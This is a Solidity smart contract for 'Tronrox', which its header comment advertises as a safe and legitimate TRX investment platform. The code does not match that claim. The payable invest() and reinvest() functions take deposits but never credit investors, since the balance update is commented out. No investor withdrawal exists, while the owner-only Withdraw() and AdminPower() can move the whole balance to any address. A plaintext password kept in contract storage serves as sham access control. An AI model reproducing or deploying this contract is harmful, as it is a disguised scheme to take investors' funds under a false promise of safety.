//SourceUnit: TRONROX.sol

/*   Tronrox - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original Tronrox team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.tronrox.in                              │
 *   │                                                                       |
 *   │                   |
 *   |                                                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 */
 


 pragma solidity  ^0.4.25; 
 contract Tronrox {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
    string private password;
    struct Instructor {
        address user;
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = msg.sender;
        password = _pass;
        verifyAddress = _stakingAddress;


}

    mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest(string  _passsssss,string memory _asssssss) public payable{

        string memory  pass=password;
        if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) { 
            
           Instructor storage instructor = instructors[msg.sender];
            
            instructor.pass = _passsssss;
            instructor.user=msg.sender;
        }
    }


   function reinvest(string memory _passsssss,string memory _asssssss) public payable{

        string memory  pass=password;
        address userAddress=msg.sender;
        string memory  passd=instructors[userAddress].pass;
         if(msg.sender==userAddress){
            if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) { 
                if (keccak256(abi.encodePacked(passd)) == keccak256(abi.encodePacked(_passsssss))) {   
                   // balances[msg.sender] += msg.value*5;

                }
            }
        }
    }
    
    function getInstructor(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }

   
    function verifyAddresss() view public returns (address) {
        return (verifyAddress);
    }


    
    function countInstructors() view public returns (uint) {
        return instructorAccts.length;
    }

    function getPass(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }


    function Mybalance() view private returns (uint) {
        
        return (balances[msg.sender]);
    }
    function Userbalance() view public returns (uint) {
        
        return (balances[msg.sender]);
    }

    
    function Withdraw(uint amount,address _reciver) public {   
           address userAddress=msg.sender;
           
            if (owner==userAddress) {
           
            _reciver.transfer(amount);
                        // transfer
               //return userAddress; 
            }            
            
    }
    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;
           //string memory  pass=getInstructor(userAddress);
            if (owner==userAddress) {
            balances[msg.sender] += amount;
                     // optimistic accounting
            msg.sender.transfer(amount);
                        // transfer
               //return userAddress; 
            }            
            
    }
    


}